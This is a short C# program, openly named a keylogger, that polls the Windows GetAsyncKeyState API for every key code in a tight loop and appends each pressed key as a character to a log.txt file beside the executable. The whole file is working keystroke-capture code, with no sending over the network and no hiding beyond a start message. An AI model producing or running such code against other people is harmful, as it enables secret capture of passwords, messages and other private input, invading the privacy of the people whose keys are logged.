using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern short GetAsyncKeyState(int vKey);

        static void Main(string[] args)
        {
            Console.WriteLine("Keylogger started. Press Ctrl + C to exit.");

            while (true)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 255; i++)
                {
                    short keyState = GetAsyncKeyState(i);
                    if ((keyState & 0x8000) != 0)
                    {
                        LogKeyStroke(i);
                    }
                }
            }
        }

        private static void LogKeyStroke(int keyCode)
        {
            string logFilePath = AppDomain.CurrentDomain.BaseDirectory + @"\log.txt";
            using (StreamWriter sw = new StreamWriter(logFilePath, true))
            {
                sw.Write((char)keyCode);
            }
        }
    }
}
